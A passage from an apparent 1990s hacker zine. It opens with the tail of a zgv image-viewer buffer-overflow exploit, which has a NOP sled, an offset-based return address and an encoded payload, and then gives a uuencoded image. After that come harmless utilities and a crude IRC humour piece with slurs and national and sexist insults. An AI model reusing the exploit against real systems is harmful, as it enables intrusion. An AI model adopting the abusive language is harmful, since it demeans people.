  "\x61\x74\x69\x6F\x6E\x46\x61\x75\x6C\x74\x20\x31\x3E\x26\x32"\
  "\x3B\x74\x6F\x75\x63\x68\x20\x63\x6F\x72\x65\x20\x23/bin/sh";

  if (argc == 1)
  {
    strncpy(pict,"heh.jpg",7);
  }
  if (argc == 2)
  {
    strncpy(pict,argv[1],255);
  }
  if (argc == 3)
  {
    strncpy(pict,argv[1],255);
    offset=atof(argv[2]);
  }
  if (argc  > 3)
  {
    fprintf(stderr,"too many optionz.\n");
    exit(-1);
  }
  if ((buff = malloc (BUFFER_SIZE + strlen (shellcode))) < 0)
    {
      printf ("malloc()");
      exit (-1);
    }
  ptr = buff;
  fcntl(1,F_SETFL,O_NONBLOCK);
  #define _NOP 0x20
  memset (ptr, (_NOP), BUFFER_SIZE);

  ptr += BUFFER_SIZE;
  addr = (long *) ptr;
  *addr = ~((*addr | get_esp()) - offset);

  printf("using offset %p\n",(get_esp()-offset));
  ptr = (char *) addr;
  *ptr = 0;

  memcpy (ptr, shellcode, sizeof (shellcode));
  execl ("/bin/sh", "sh", opts, shellcode, NULL);
  execl (ZGV_PATH,"zgv",pict);
}
[END_CUT] zgvexploit.c
[CUT_HERE] heh.jpg.uu
begin 644 heh.jpg
M1TE&.#=A%``>`/<``````*K_]@#_Y@"JF00$!`4%!08&!@<'!P@("`D)"0H*
M"@L+"PP,#`T-#0X.#@\/#Q`0$!$1$1(2$A,3$Q04%!45%186%A<7%Q@8&!D9
M&1H:&AL;&QP<'!T='1X>'A\?'R`@("$A(2(B(B,C(R0D)"4E)28F)B<G)R@H
M*"DI*2HJ*BLK*RPL+"TM+2XN+B\O+S`P,#$Q,3(R,C,S,S0T-#4U-38V-C<W
M-S@X.#DY.3HZ.CL[.SP\/#T]/3X^/C\_/T!`0$%!04)"0D-#0T1$1$5%149&
M1D='1TA(2$E)24I*2DM+2TQ,3$U-34Y.3D]/3U!04%%145)24E-34U145%55
M55965E=75UA86%E965I:6EM;6UQ<7%U=75Y>7E]?7V!@8&%A86)B8F-C8V1D
M9&5E969F9F=G9VAH:&EI:6IJ:FMK:VQL;&UM;6YN;F]O;W!P<'%Q<7)R<G-S
M<W1T='5U=79V=G=W=WAX>'EY>7IZ>GM[>WQ\?'U]?7Y^?G]_?X"`@(&!@8*"
M@H.#@X2$A(6%A8:&AH>'AXB(B(F)B8J*BHN+BXR,C(V-C8Z.CH^/CY"0D)&1
MD9*2DI.3DY24E)65E9:6EI>7EYB8F)F9F9J:FIN;FYR<G)V=G9Z>GI^?GZ"@
MH*&AH:*BHJ.CHZ2DI*6EI::FIJ>GIZBHJ*FIJ:JJJJNKJZRLK*VMK:ZNKJ^O
MK["PL+&QL;*RLK.SL[2TM+6UM;:VMK>WM[BXN+FYN;JZNKN[N[R\O+V]O;Z^
MOK^_O\#`P,'!P<+"PL/#P\3$Q,7%Q<;&QL?'Q\C(R,G)R<K*RLO+R\S,S,W-
MS<[.SL_/S]#0T-'1T=+2TM/3T]34U-75U=;6UM?7U]C8V-G9V=K:VMO;V]S<
MW-W=W=[>WM_?W^#@X.'AX>+BXN/CX^3DY.7EY>;FYN?GY^CHZ.GIZ>KJZNOK
MZ^SL[.WM[>[N[N_O[_#P\/'Q\?+R\O/S\_3T]/7U]?;V]O?W]_CX^/GY^?KZ
M^OO[^_S\_/W]_?[^_O___RP`````%``>```(E@`#"!Q(L*#!@P@'#DB8<,!"
MA@8'2(184.)$B@(E:C0HH*/'CAHW%OSX4:-&CB1!FAQ@D*1'DQ(-NE1I4J9+
M`1)SLAQY,V=.F3U]LN39L2A.GRR)%J69LV"`HE"/^G0*%:K/F$JM^F2I5*M/
MJE69QE3JM:E2KTV5>FU:T:=;GVU]RO5)<*[=IAGMZF490*]?ECX#"_89$``[
`
end
[END_CUT] heh.jpg.uu
[END_DIR] zgvexploit
[EOW]

                                       +
------------------------------------------------------------------------------
                                       +
[(004) Sample Alphabetical Sort by PercY]
                                       +
------------------------------------------------------------------------------
                                       +
Basically all this does is sorts a string alphabetically a certain number of
times. (after this gets a perfectly sorted array, it stops sorting, no
matter how many iterations are specified).
coded for learning basic sorting algorithms.
- PercY.
gcc asort.c -o asort -O
[BEGIN_DIR] sort
[CUT_HERE] asort.c
#include <stdio.h>
#include <stdlib.h>
int verbose;
char *asort(char arr[])
{
   register int y=0,c=0;
   int arrlen = strlen(arr);
   register char tmp;

   for(;;){
      if ( ((int) (arr[y])) > ((int) (arr[y+1])) && arr[y+1]!=(char)NULL )
	{ c++; tmp=arr[y+1]; arr[y+1]=arr[y]; arr[y]=tmp; }
      if ((y+1)>=arrlen) { y=-1; if (c==0) break; else c=0; }
      if (verbose==1) { printf("%s\n",arr); }
      else if (verbose==2) { (void)putchar('*'); }
      y++;
      }
     if (verbose!=-1)
         printf("%s\n",arr);

     return arr;
}

int main(int argc,char *argv[])
{
  int x=0;
  char buf[1024];
  if (argc<2) {
      (void)fprintf(stderr,"usage: %s - | [string1 string2 ...]\n"
                           "-[v | d | q]\n",argv[0]);
      exit(-1);
  }
  if (!strcmp(argv[argc-1],"-v"))
  {
    verbose = 1;
    argc--;
  }
  else
  if (!strcmp(argv[argc-1],"-d"))
  {
    verbose = 2;
    argc--;
  }
  else
  if (!strcmp(argv[argc-1],"-q"))
  {
    verbose = -1;
    argc--;
  }
  else
    verbose = 0;
  if (!strcmp(argv[argc-1],"-"))
  {
      for(;fgets(buf,1024,stdin);)
           asort(buf);
  } else {
           for(x=1;x<argc;x++)
               asort(argv[x]);
  }
  return;
}
[END_CUT] asort.c
[END_DIR] sort
[EOW]
                                       +
------------------------------------------------------------------------------
                                       +
[(005) Make-a-file-spiffy by sf1nkt3r]
                                       +
------------------------------------------------------------------------------
                                       +
stupid code i wrote long ago to make a text file look cooler.
(recommended for reading long boring RFC's).
usage: cat RFC-1342.txt | lightbright_even > RFC-1342.cool.txt
++     cat RFC-1342.txt | lightbright_rand > RFC-1342.cool.txt
++     cat RFC-1342.txt | typetext 0.10
-- feel free to mix and match them! --

we recommend cat ~el8[0] | lightbright_rand | typetext 0.10

[BEGIN_DIR] spiffy
[CUT_HERE] lightbright_even.c
#define LIGHT_COLOR "\033[0;36m"
#define BRIGHT_COLOR "\033[1;36m"
#define light(x) printf("\033[m%s%c",LIGHT_COLOR,x)
#define bright(x) printf("\033[m%s%c",BRIGHT_COLOR,x)
#include <stdio.h>
void 
main(void)
{
  char peep;
  int x=0;
  for(;(peep=getchar())!=EOF;x++)
  if (x%2==0) light(peep); else bright(peep);
  puts("\033[m"); 
}
[END_CUT] lightbright_even.c
[CUT_HERE] lightbright_rand.c
#define LIGHT_COLOR "\033[0;36m"
#define BRIGHT_COLOR "\033[1;36m"
#define light(x) printf("\033[m%s%c",LIGHT_COLOR,x)
#define bright(x) printf("\033[m%s%c",BRIGHT_COLOR,x)
#include <stdio.h>
void
main(void)
{
  char peep;
  int x=0;
  for(;(peep=getchar())!=EOF;)
  if ((int)peep%2==0) light(peep); else bright(peep);
  puts("\033[m");
}
[END_CUT] lightbright_rand.c
[CUT_HERE] typetext.c
#include <stdio.h>
#include <time.h>
#include <string.h>
#include <ctype.h>

int
main (int argc, char *argv[])
{
  struct timespec speed;
  char buff[1024];
  char *sec, *nsec;
  register int x;
  if (argc>1){
      sec           = strtok(argv[1],".");
      nsec          = strtok(NULL,"\0");
      if (*sec=='\0') sec = argv[1];
      if (*nsec=='\0') nsec="0";
      speed.tv_sec  = (unsigned int)atoi(sec);
      speed.tv_nsec = atol(nsec);
  }
  else {
      speed.tv_sec  = 0;
      speed.tv_nsec = 10;
  }

  setvbuf(stdout,(char*)NULL,_IONBF,0);

  for (;;)
    {
      bzero (&buff, sizeof buff);
      if (!fgets (buff,sizeof buff,stdin))
	break;

      for (x=0;x<=strlen(buff);x++)
	{
	  if (isprint(buff[x])) // faster ANSI code output. [only \033
	                        // will be caught though :(          ]
	      nanosleep(&speed,NULL);
	  write(1,&buff[x],1);
	}
    }

  return (0);
}
/* (C) ~EL8 AND MIA/POW */
/* rewritten by tMoL */
[END_CUT] typetext.c
[END_DIR] spiffy
[EOW]
                                       +
------------------------------------------------------------------------------
                                       +
[(006) Enhanced XOR Encryption by tMoL]
                                       +
------------------------------------------------------------------------------
                                       +
This file uses enhanced XOR encryption using the psuedo random number
generator. XOR = Strongest available encryption next to rot13 and memfrob().
(Export Restrictions may Apply)

[BEGIN_DIR] encryption
[CUT_HERE] x0r.c
// cat secret.file | x0r > secret.file.x0r
#include <stdio.h>
#include <stdlib.h>
#define spice 0xDEADBEEF
void
main(void)
{
  unsigned char jeepers;
  srand(spice);
  while((jeepers=getchar())!=(unsigned char)EOF)
    putchar(jeepers^(int)((int) 1+(254.0*rand()/(RAND_MAX+1.0))));
  exit(0);
}
[END_CUT] x0r.c
[END_DIR] encryption
[EOW]
                                       +
------------------------------------------------------------------------------
                                       +
[(007) UDP reliability testing by movl]
                                       +
------------------------------------------------------------------------------
                                       +
the following file will give you an idea of how reliable connectionless
communication is between you and a remote host.
it sends a defined message via both TCP and UDP and then checks if both
return the same message.

 !--! This code is in development stage. Expect either patches !--!
 !--! or an update in ~el8[1].                                 !--!

[BEGIN_DIR] UDPvsTCP
[CUT_HERE] uvt.c
#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <unistd.h>
#include <signal.h>
#include <errno.h>
#include <netinet/in.h>

#define ERRSTR "\033[1;33m!\033[m"
#define SYNSTR "\033[1;32m*\033[m"

char *msg[]={"how now brown cow?",
            "yo, what is up?   ",
            "yo, gihjrwo       ",
            "FINISHSHHSHGSDG   "};
void sig(int s);
int udpsock,tcpsock;
void 
main(int argc,char *argv[])
{
  //int udpsock,tcpsock;
  struct sockaddr_in tcps,udps;
  char buf[255];
  int n=0,tcpbytes=0,udpbytes=0,utotal=0,ttotal=0;
  int good=0;
  int x;
  if (!(argc==3)) {
    fprintf(stderr,"usage: %s <ip> <tcp port>\n",argv[0]);
    exit(-1);
  }
  signal(SIGTERM,sig);
  signal(SIGINT,sig);
  signal(SIGKILL,sig);
  signal(SIGSEGV,sig);
 
  
  if ((udpsock = socket(AF_INET, SOCK_DGRAM, 0)) == -1) {
            perror("socket(SOCK_DGRAM)");
            exit(-1);
  }
  if ((tcpsock = socket(AF_INET, SOCK_STREAM, 0)) == -1) {
            perror("socket(SOCK_STREAM)");
            exit(-1);
  }
  signal(SIGINT,sig);
  udps.sin_family = AF_INET;
  udps.sin_addr.s_addr = inet_addr(argv[1]);
  
  tcps.sin_family = AF_INET;
  tcps.sin_addr.s_addr = inet_addr(argv[1]);
  tcps.sin_port = htons(atoi(argv[2]));
  
  if (connect(tcpsock,(struct sockaddr *)&tcps,sizeof(tcps))< 0) {
    perror("couldn't start a conversation with server!");
    exit(-1);
  }

  if (send(tcpsock,"START",5,0)==-1)
  {
     perror("couldn't send starter msg");
     exit(-1);
  }
  if (recv(tcpsock,buf,sizeof(buf),0)==-1)
  {
     perror("server wouldnt respond to us :( ");
     exit(-1);
  }
  if (sscanf(buf,"UDP %i",&x)!=1)
  {
     fprintf(stderr,"incorrect server response, check TCP port, try again.\n");
     exit(-1);
  }
  udps.sin_port = htons(x);
  
  fprintf(stderr,"%s [UDP PORT #%i] [TCP PORT #%i] [sending]\n",argv[1],x,
	                                                        atoi(argv[2]));
  for(n=0;msg[n]!=NULL;n++){
     
     udpbytes=sendto(udpsock, msg[n], strlen(msg[n]), 0,
		    (struct sockaddr*)&udps, sizeof(struct sockaddr));
     tcpbytes = send(tcpsock, msg[n], strlen(msg[n]), 0);
     
     if (tcpbytes!=udpbytes) fputs(ERRSTR,stderr); 
                             else { fputs(SYNSTR,stderr); good++; }
     if (tcpbytes>0) ttotal+=tcpbytes;
     if (udpbytes>0) utotal+=udpbytes;
  }
  
  if (send(tcpsock,"DONE",5,0)==-1) {
     perror("couldnt tell the server we finished!"); exit(-1); }
  fprintf(stderr,"----------------------------[%s]--\n",argv[1]);
  fprintf(stderr,"UDP:\t[%i bytes sent]\n",utotal);
  fprintf(stderr,"TCP:\t[%i bytes sent]\n",ttotal);
  fprintf(stderr,"(%i synchronized packets sent [%i bad])\n",good,(n-good));
             
  close(udpsock);
  close(tcpsock);
  exit(0);
}
void sig(int s)
{
   send(tcpsock,"DONE",5,0);
   printf("\n%i\n",s);
   sleep(1);
   close(tcpsock);
   close(udpsock);
   exit(1);
}
[END_CUT] uvt.c
[CUT_HERE] uvtd.c
#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <unistd.h>
#include <signal.h>
#include <netinet/in.h>

#define ERRSTR "\033[1;33m!\033[m"
#define SYNSTR "\033[1;32m*\033[m"

char msg[7][3]={"how",	//0
                " no",	//1
                "w, ",	//2
                "bro",	//3
                "wn ",	//4
                "cow",	//5
                "?  "};	//6
                
#define UDP_PORT 31337
#define TCP_PORT 31338
int udpsock,tcpsock,tcpsock2;
void sig(int s)
{
   close(udpsock);
   close(tcpsock);
   close(tcpsock2);
   printf("\n%i\n",s);
   exit(1);
}
void 
main()
{
  int udpsock,tcpsock,tcpsock2;
  struct sockaddr_in udpme,udpyou;
  struct sockaddr_in tcpme,tcpyou;
  char ubuf[255],tbuf[255];
  int n=0,tcpbytes=0,udpbytes=0,utotal=0,ttotal=0;
  int verbose=0,good=0;
  int adr;
  signal(SIGINT,sig);
  signal(SIGKILL,sig);
  signal(SIGSEGV,sig);
  signal(SIGTERM,sig);
  
  if ((udpsock = socket(AF_INET, SOCK_DGRAM, 0)) == -1) {
            perror("socket(SOCK_DGRAM)");
            exit(-1);
  }
  if ((tcpsock = socket(AF_INET, SOCK_STREAM, 0)) == -1) {
            perror("socket(SOCK_STREAM)");
            exit(-1);
  }
   
  udpme.sin_family = AF_INET;
  udpme.sin_port = htons(UDP_PORT);
  udpme.sin_addr.s_addr = INADDR_ANY;
  
  tcpme.sin_family = AF_INET;
  tcpme.sin_port = htons(TCP_PORT);
  tcpme.sin_addr.s_addr = INADDR_ANY;
    
  if (bind(tcpsock, (struct sockaddr *)&tcpme, sizeof(struct sockaddr))==-1){
            perror("tcp bind");
            exit(-1);
        }
  if (bind(udpsock, (struct sockaddr *)&udpme, sizeof(struct sockaddr))==-1){
              perror("udp bind");
              exit(-1);
  }
  if (listen(tcpsock, 2) == -1) {
            perror("tcp listen");
            exit(-1);
  }

   adr=sizeof(tcpyou);
        for(;;) {  
            
            if ((tcpsock2 = accept(tcpsock, (struct sockaddr*)&tcpyou,
				   &adr)) == -1) {
                perror("tcp accept");
                continue;
            }
            bzero(&tbuf,sizeof(tbuf));
            recv(tcpsock2,tbuf,sizeof(tbuf),0);
            if (!strcmp(tbuf,"START"))
            {
            bzero(&tbuf,sizeof(tbuf));
            sprintf(tbuf,"UDP %i",UDP_PORT);
            if (send(tcpsock2,tbuf,sizeof(tbuf),0)==-1) break;
            adr=sizeof(struct sockaddr);
            fprintf(stderr,"%s [recieving]\n",inet_ntoa(tcpyou.sin_addr));
            for(;;){
               
	       udpbytes=recvfrom(udpsock, ubuf, sizeof(ubuf), 0,
		(struct sockaddr*)&udpyou, &adr);
               
	       tcpbytes=recv(tcpsock, tbuf, sizeof(tbuf), 0);
               if (udpbytes<0||tcpbytes<0) continue;
	       if((!strcmp(tbuf,"DONE"))||(!strcmp(ubuf,"DONE")))
               {
                   close(tcpsock2);
                   tcpbytes-=4;
                   break;
               }
               if((*tbuf='\0')||(*ubuf='\0'))
               {
                   close(tcpsock2);
                   break;
               }
	       n++;
               if (strcmp(tbuf,ubuf))
                   fputs(ERRSTR,stderr);
	       else {
	           fputs(SYNSTR,stderr);
	           good++;
	       }
               if (tcpbytes>0)
                   ttotal+=tcpbytes;
               if (udpbytes>0)
                   utotal+=udpbytes;
               
//	       if (tcpbytes<0 || udpbytes<0) break;
               
	       bzero(&tbuf,sizeof(tbuf));
	       bzero(&ubuf,sizeof(ubuf));
            }
   

           fprintf(stderr,"----------------------------[%s]--\n",
		   inet_ntoa(tcpyou.sin_addr));
           fprintf(stderr,"UDP:\t[%i bytes sent]\n",utotal);
           fprintf(stderr,"TCP:\t[%i bytes sent]\n",ttotal);
           fprintf(stderr,"(%i synchronized packets sent [%i bad])\n",
		   good,(n-good));
           good=0; n=0;
	   break;
	   //close(tcpsock2);
           }
           
        }
       
  close(udpsock);
  close(tcpsock);
  exit(0);
}
[END_CUT] uvtd.c
[END_DIR] UDPvsTCP
[EOW]
                                       +
------------------------------------------------------------------------------
                                       +
[(010) Obfuscated Codez by bob]
                                       +
------------------------------------------------------------------------------
                                       +
a couple of first tries at writing obfuscated codez. (see ioccc.org)

[BEGIN_DIR] obfuscated
[CUT_HERE] ob1.c
#include <stdio.h>
#define ___ int
#define ____ main
#define _____ (
#define ______ void
#define _______ )
#define ________ {
#define _________ char
#define __________ hello[20]
#define ____________ =
#define _____________ "Hello World"
#define _______________ ;
#define ________________ printf
#define _________________ (
#define __________________ "%s"
#define ___________________ ,
#define ____________________ hello
#define _____________________ )
#define ______________________ ;
#define _______________________ exit
#define ________________________ (
#define _________________________ 0x00
#define __________________________ +
#define ___________________________ 0x00
#define ____________________________ *
#define _____________________________ 0x0000000L
#define ______________________________ )
#define _______________________________ ;
#define ________________________________ }


       ___ ____ _____ ______ _______ ________ _________ __________
    ____________             _____________ _______________ ________________
  _________________        __________________  ___________________
 ____________________     _____________________
 ______________________     _______________________ ________________________
 _________________________     __________________________
  ___________________________     ____________________________
   _____________________________     ______________________________
     _______________________________     ________________________________
[END_CUT] ob1.c

program i used to create ob1.c (ok.. so i cheated)

[CUT_HERE] obfuse.c
/***********************************/
/* code is a tad bit broken        */
/* [-------------by bob----------] */
/* cat gay.c | obfuse gay.ob.c     */
/* cat gay.c | obfuse - > gay.ob.c */
/***********************************/

#include <stdio.h>
#include <stdlib.h>
#define CHAR "_" /* "A" "Y" "oO" "eE" "iI" "_l" */
int main ( int argc , char * * argv )
{
  int i = 0 , c = 0 ;
  char s [255] , g [2555] ;
  FILE * out ;
  if ( ( out = fopen ( argv[1] , "w+" ) ) == NULL || !strcmp(argv[0],"-"))
      {
        out = stdout;
      }
  
  for ( ; ; ) {
   
   if ( feof ( stdin ) )
     exit( 0 ) ;
   if ( scanf ( "%s" , s ) == 1 )
     {
      printf ( "#define " ) ;
      for ( c = i ; c >= 0 ; c-- ) { printf ( CHAR ) ; fprintf ( out , CHAR ) ; }
      printf ( " %s\n" , s ) ;
      fprintf ( out, "\n" ) ;
     }
   if ( feof ( stdin ) )
     exit ( 0 ) ;
    i++ ;
  }
}

[END_CUT] obfuse.c
[END_DIR] obfuscated
[EOW]

                                       +
------------------------------------------------------------------------------
                                       +
[(011) Various IRC Warez by variouz]
                                       +
------------------------------------------------------------------------------
                                       +
[BEGIN_DIR] IRC
[CUT_HERE] school.HOWTO
	TIPS FOR * NOT * GETTING SCHOOLED by: S1LLYG00S3

	When it comes to schooling, you're either elite, or you're lame. For
the elite people in the audience, most of this paper does not apply. For the
lame people on the other foot, this paper may be very useful for your daily
irc lives.

	'schooled' (v) : GETTIN` OWNED, getting learned, not knowing what
someone else knows, not being able to answer seemingly easy or hard questions,
teacher / primate sex.

	First of all, it comes in every hackers life, the day of judgement,
when a hacker becomes a man ( the author cators towards the men because, well,
we all know, they're aint no women hackers. ).

	When will your day come? When you drop a line of text in any hacker
channel : #hackphreak@undernet, #2600@dalnet, #hack@efnet, #feed-the-goats@efnet, #rootworm@undernet, are just a couple examples.

	Our goal? The goal of this paper is too enlighten the reader by showing
them the various ways from being schooled, we will cover a couple of approaches.

	Before we continue, i must state a few things, * everyone * from
Canada is a retard. ALmost everyone from the UK is a retard. Everyone from
.il is a retard. Everyone who is not informed after reading this paper,
...
is a retard.

	[ We will be using irc logs to represent our methods. ]

	METHOD(1) "OH SHIT!" Approach
	
	<schooler> School me on tcp/ip mother fucker

	This is a classic situation, with sutch a broad range of topics,
	a simple reply shall be:

	<schooled> OH SHIT! brb du()de, my analogue digital accoustic accoupler
		is throwing a fit ! ! !

	pseudo:
	<school> OH SHIt! <text> (!!!)/</quit>


	METHOD(2) "HAHAHAHAHAHA" Approach

	<schooler> What is a system call lamer?

	I find this to be a very good approach, if you simply do not know the
		answer to a question, simple "HAHAHAHAHAHAHHAA". Extensive
		research states that the <schooler> will think of himself as
		dumb, or maybe messing up on the statement, thus allowing a
		weakness to be exploited.

	<schooled> HAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAH!!!!
	[possible fallowups]
	<schooled> OMG HAHAHAH OMG WHAT A FUCKING RETARD HAHAHAHAHAH!
	[even more fallowups?]
	<schooled> /me ROFLMAO HAHAH!

	[possible reaction]
	*** [BitchXvw95] schooler has left #hack ***

	pseudo:
	<schooled> <HAHA^2[^2][^2]>
	[POSSIBLE FALLOW UPS]


	METHOD(3) "IRC Ping Timeout!"

	<schooler> Ok hotshot, what is a shellcode?

	Now, this is one of the most ingenius methods... Pioneered by, you
		guessed it, Rloxley, and many efneters, this method is
		quite reliable. First you can have a prefix line such as:

	<schooled> uhg.. this lag is killing me,

	or

	<schooled> why the fuck are you [pinging/packeting] me <schooler>?
	[possible ctcp ping log]
	<schooled> wtf is this <schooler> [el8@hacker.com] requested PING 938977	465 425281 from #hack

	For this method to work, we must raise our idle time to that of an
		IRC Ping Timeout, the IRC rfc is your friend. Lets say the
		irc server pings you, PING :irc.dal.net, you must wait for
		in our case 255 seconds, then get the appropriate quit syntax
		for your irc server, this is always handy to keep around.

	One from efnet /quit Ping timeout: 360 seconds

	<schooled> /quit Ping Timeout
	*** Signoff schooled (Ping Timeout)
	
	[possible fallowup]

	<channel gaurdian> has kicked <schooler> off #hack (no DoS lamer!)

	PS: Ingenius

	pseudo:
	/quit your irc server quit message here


	METHOD(3) "Away" Approach

	<schooler> How much bits is a bytes lamer?

	Now, these sort of questions come up alot, one solution is the Away
		approach. Simply /away <msg>

	<schooled> /away coding

	Coding is a very often used away message, because the schooler will
		think twice of trying to school you again.

	[Often used away messages]

	<schooled> /away movl %esp, %ebp
	This is the assembler approach.
	<schooled> /away printf("Hello, world.\n");
	Sarcasmic fearsome away message.
	<schooled> /away AAAAAAAAAAAAAAAAAA/bin/sh
	They will think you write exploits.
	<schooled> /away [gH] coding [gH]
	The group example, which is very useful.
	<schooled> /away int * ptr;
	Not many hackers that code, actually know what pointers are.

	pseudo:
	/away <msg>


	METHOD(4) "Excess flood" Approach

	<schooler> Show me some of your code if you think you can code.

	Incredible approach towards this question is to:

	<schooled> /quit Excess Flood

	[possible reaction]

	<schooler> I bet he tried to paste his code, must have been big.
	<civilian> yeh, he showed u LOL

	pseudo:
	/quit Excess Flood


	METHOD(5) "Paste" Approach

	For this approach, we bend the rules, we bend them so far, they break,
		so we are actually breaking the rules. But, let's consider we
		aren't breaking the rules but simply bending them.

	Paste? "What the fuckshit do you mean by paste?" Here's what i mean:
		We find a very informative source, or code, etc, then simply
		paste it to the input of our irc program [ mIRC, BitchX ].
		Please note that raw telnet won't work for this method, because
		we haveto PRIVMSG #channel :text, unless we format what we
		paste first, which is beyond the scope of this document.

	<schooler> Uh, what the fuck are you doing ^Blamer?^B Answer the gosh
		damn question, now.

	Let's say you wanted to paste code, and pass it off as yours, here's
		where the tricky part comes in.

	Using your web browser, connect to ioccc.org, find code which is
		absoultely uncomprehendible to the common hacker. * Highlight *
		the code using your * Mouse * ( If you're in windows, choose
		copy from the EDIT menu. ) Position your I-BEAM over your IRC
		session, clock the right button, and wallah.

	[ This method might not work with people who use TextTypeSPeakers,
		Bally Mice, or wierd mouse devices. ]

	Here is the example:

	lynx connecting to ioccc.org

	^click^ People who have won

	^key^ the down arrow about twenty times

	^click^ davidguy
	
	^click^ davidguy.c

	Select the code <what i selected>

#define C if(i){q=Q*4+(s=(w)D(q,s)
u A,U,Q,J,X[9999],B;main(a,b)w*b;{r*c,*d,y=0,f,g,F,I,M,N,z,*x,*n,i,G;w q,*h=(w
)X,*T,*s=".slo.-W00,tmhw.W/";T=h;if(a>1){e;s=b[1];Y;Y;Y;Y;T=h;H;K=23;Y+=112;T=
h;Y;y= *--T;H=2;}else{H=1;W*s)K=1+*s++;}connect(A=socket(a,1,0),T=h,24-a*4);H=

	Wow, i see connect() and socket() in that code, any hacker should
		know what that is and that this is a C program that took
		incredible amounts of inteligence to make.

	^type^ q
	
	LYNX - CYA LATER SILLYG00S3
	[customized lynx source]

	Position Block-Icon over irc session, click right button.

	<schooled>#define C if(i){q=Q*4+(s=(w)D(q,s)
	<schooled>u A,U,Q,J,X[9999],B;main(a,b)w*b;{r*c,*d,y=0,f,g,F,I,M,N,z,*x,*n,i,G;w q,*h=(w
	<schooled>)X,*T,*s=".slo.-W00,tmhw.W/";T=h;if(a>1){e;s=b[1];Y;Y;Y;Y;T=h;H;K=23;Y+=112;T=
	<schooled>h;Y;y= *--T;H=2;}else{H=1;W*s)K=1+*s++;}connect(A=socket(a,1,0),T=h,24-a*4);H=

	[possible reaction to your mistake! :D]
	
	<schooled> fuck man shit sorry

	[possible reaction from your assailent]
	
	<schooler> Heh, werd schooled, that looks like C

	[possible reaction from self]

	<schooled> Uhm, of course idiot.
	[you won!:D]

	or

	<schooler msgd you> send me that code du()de.

	<schooled> <schooler msgd you> send me that code du()de. HAHAHAHAHHAHAH
		HAHAHAHAHAHAHAHAHAHAH what a lamer.

	[Very tactful skill, we're incorperating method 2]

	pseudo:
	reread this if you don't remmeber please thanx.	


	METHOD(6) "Dates" Approach

	<schooler> Ahhhh come on you littal bitch, school me now.

	First of all, can i get a What What? This approach is simple.

	First, find todays date, and here's the example session:

	<schooled> holy cow, i just turned 13!!!!!!!!!!!!!!!!!!!!!!
	This is the BirthDay approach, very reliable.
	[possible fallowups]
	<schooled> /away cuttin some 0day cake!!!!!!!!!!!!!!!!!!!!!

	or

	<schooled> Damn, 20 years since my cat CottonPeaCar died, brb :(
	Frowny face denotes pain, anguish, suffering, and sarrow.
	[possible fallowups]
	<schooler> sorry to hear :[ cya <schooled>

	pseudo:
	<schooled> [Happy/Bad] [its date] [happy/bad(reason)]


	METHOD(7) "A last resort" Approach

	<schooler> COME ON MOTHERFUCKER ANSWER IT, ANSWER THE QUESTION,
		LIKE I THOUGHT, YOU ARE OWNED + LAME.

	In real life we'd just bust a cap in this situation, but in irc, it's
		a whole different level.

	When things get extreme (fuck slim jims), we snap into method 7.
	
	This is where we defy hacker-ethic, and abide by our instincts.

	
	[ Get crumpt ]

	Here's our response:

	<schooled> OK SURE MOTHER FUCKER YOU ARE LAAAAAAAAAAAAAAAAME
        <schooled> OK SURE MOTHER FUCKER YOU ARE LAAAAAAAAAAAAAAAAME
        <schooled> OK SURE MOTHER FUCKER YOU ARE LAAAAAAAAAAAAAAAAME
        <schooled> OK SURE MOTHER FUCKER YOU ARE LAAAAAAAAAAAAAAAAME
        <schooled> OK SURE MOTHER FUCKER YOU ARE LAAAAAAAAAAAAAAAAME
        <schooled> OK SURE MOTHER FUCKER YOU ARE LAAAAAAAAAAAAAAAAME
        <schooled> OK SURE MOTHER FUCKER YOU ARE LAAAAAAAAAAAAAAAAME
        <schooled> OK SURE MOTHER FUCKER YOU ARE LAAAAAAAAAAAAAAAAME
        <schooled> OK SURE MOTHER FUCKER YOU ARE LAAAAAAAAAAAAAAAAME
        <schooled> OK SURE MOTHER FUCKER YOU ARE LAAAAAAAAAAAAAAAAME
        <schooled> OK SURE MOTHER FUCKER YOU ARE LAAAAAAAAAAAAAAAAME
        <schooled> OK SURE MOTHER FUCKER YOU ARE LAAAAAAAAAAAAAAAAME
        <schooled> OK SURE MOTHER FUCKER YOU ARE LAAAAAAAAAAAAAAAAME
        <schooled> OK SURE MOTHER FUCKER YOU ARE LAAAAAAAAAAAAAAAAME
        <schooled> OK SURE MOTHER FUCKER YOU ARE LAAAAAAAAAAAAAAAAME
        <schooled> OK SURE MOTHER FUCKER YOU ARE LAAAAAAAAAAAAAAAAME
        <schooled> OK SURE MOTHER FUCKER YOU ARE LAAAAAAAAAAAAAAAAME
        <schooled> OK SURE MOTHER FUCKER YOU ARE LAAAAAAAAAAAAAAAAME

	[ This will most likely get you kickbanned, but hey, whose got the
		respect now? ]

	pseudo:
	label1:
	<schooled> <msg>
	goto label1:

	BONUS COVERAGE METHOD!!!!!

	Let's say this is a DCC message schooling, what now? He's pissing you
		off, you have yes? That's right, 'yes', or how about
		"/usr/bin/yes". "Oh that yes!" That's right. Here's what you do:

	[ This works if you use a unix client and you run unix. ]

	/exec -m <schooler>= yes YOU'RE LAME!

	-m = -message
	
	<schooler> = assailaint

	(EQL)= = DCC

	yes = /usr/bin/yes

	YOU'RE LAME! = Text for yes to print.

	[ This is what /usr/bin/yes was actually intended for. ]


	METHOD(8) "Drugs" Approach

	<schooler> What is memory?

	This method was pioneered by endless hacker groups, such as:
	gH, X-Ploit, milw0rm, B4b0, BoW, and HFG

	Such individuals from gH and B4b0, such as ,mh, ph1x, chrak, use this
		method quite often.

	One of such stature as ph1x should be awarded the honor of this method,
		simply because he/she/moron is the best at it.

	This method is actually quite simple, act like you're on drugs.

	<schooled> MNA GOE AWXAY DU()DE EYI JUS DROPING TOW TABS OV ACID
	[	   MAN GO  AWAY  DUDE   I   JUST DROPPED TO TABS OF ACID]


	[excuse me if i mess up on the drug 'ebonix'/'toungue', i'm french.]

	<schooled> LAAAAAAAA DEEEEEEE DAAAAA

	<schooled> ikna belv im ircnn talkig tu y(]u lamsdrr
	[i cant beleive im ircing talking to you lamer]

	An incredible method, studied for months, endless research, this method
		is 99.9x(-)46 effective.

	[possible reaction]

	<schooler> Oh sh!T i jus dropn sevens of tabs of the acids
	[	   Oh shit i just dropped seven tabs of acid aswell]

	[possible bondage]

	pseudo:
	<schooler> [type it fucked up<msg(mention drugs)>]


